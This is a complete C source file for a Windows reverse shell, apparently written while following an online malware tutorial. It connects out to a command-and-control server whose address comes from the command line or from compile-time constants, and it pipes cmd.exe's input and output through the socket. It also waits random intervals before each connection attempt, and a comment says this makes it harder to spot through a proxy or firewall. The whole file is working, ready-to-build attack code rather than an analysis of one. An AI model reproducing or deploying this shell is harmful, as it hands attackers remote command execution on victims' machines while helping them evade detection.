#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#pragma warning( disable: 4996 )

//From following https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/

//From https://stackoverflow.com/questions/2509679/how-to-generate-a-random-integer-number-from-within-a-range, used to give us a random sleep time.
unsigned int rand_interval(unsigned int min, unsigned int max)
{
	int r;
	const unsigned int range = 1 + max - min;
	const unsigned int buckets = RAND_MAX / range;
	const unsigned int limit = buckets * range;

	/* Create equal size buckets all in a row, then fire randomly towards
	 * the buckets until you land in one of them. All buckets are equally
	 * likely. If you land off the end of the line of buckets, try again. */
	do
	{
		r = rand();
	} while (r >= limit);

	return min + (r / buckets);
}

void RunShell(char* C2Server, int C2Port) {
	int count = 0; //Counter used to auto-exit after a period of time.
	int maxTries = 10; //The number of times to try connecting and then die.
	while (TRUE) {
		//Exit if we go past our max tries. Only adding this in in case something breaks
		if (count >= maxTries) {
			exit(0);
		}
		//As pointed out in the blog, randomising this makes it harder to spot through a proxy or firewall.
		Sleep(rand_interval(2000, 7000));

		//printf("Attempting connection to C2 - ");
		SOCKET C2Sock;
		SOCKADDR_IN C2Addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		//Set up our local socket.
		C2Sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		C2Addr.sin_family = AF_INET;
		
		//Set the IP and port of the C2 server.
		C2Addr.sin_addr.s_addr = inet_addr(C2Server);
		C2Addr.sin_port = htons(C2Port);
		//printf(C2Server);
		//printf(":%d \n", C2Port);
		//Let's try setting up our socket. If not let's wait and try later.
		if (WSAConnect(C2Sock, (SOCKADDR*)&C2Addr, sizeof(C2Addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			//printf("Oh dear, couldn't connect %d", WSAGetLastError());
			closesocket(C2Sock);
			WSACleanup();
			count++;
			continue;
		}
		else {
			//Try connecting to the C2 Server
			char RecvData[DEFAULT_BUFLEN];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(C2Sock, RecvData, DEFAULT_BUFLEN, 0);
			//We failed to connect. :(
			//If we can't let's wait and try later.
			if (RecvCode <= 0) {
				closesocket(C2Sock);
				WSACleanup();
				count++;
				continue;
			}
			else {
				//Set up our process.
				char Process[] = "cmd.exe";
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo; //Pinfo is used by the CreateProcess function to fill in process information. We hold the object and pass the address to the CreateProcess function so that we can get the info back.
				//Set the size for the sinfo struct in memory.
				memset(&sinfo, 0, sizeof(sinfo));
				//Set our startup info.
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				//Set all input and output to go to our socket.
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)C2Sock;
				//Start the process
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				//Wait for the process to start.
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(C2Sock, RecvData, DEFAULT_BUFLEN, 0);
				if (RecvCode <= 0) {
					closesocket(C2Sock);
					WSACleanup();
					count++;
					continue;
				}
				if (strcmp(RecvData, "exit\n") == 0) {
					exit(0);
				}
			}
		}
		
	}	

}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = IP;
        int port = PORT;
        RunShell(host, port);
    }
    return 0;
}


